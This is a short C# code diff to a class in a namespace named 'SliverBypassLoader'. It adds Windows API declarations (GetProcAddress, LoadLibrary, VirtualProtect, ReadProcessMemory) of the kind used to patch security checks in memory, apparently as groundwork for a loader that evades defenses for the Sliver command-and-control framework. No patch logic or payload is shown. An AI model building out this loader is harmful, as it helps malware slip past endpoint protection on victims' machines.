@@ -16,7 +16,11 @@ namespace SliverBypassLoader
 {
     class altbypass
     {
-
+        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
         public static void Main(string[] args) 
         { 
         
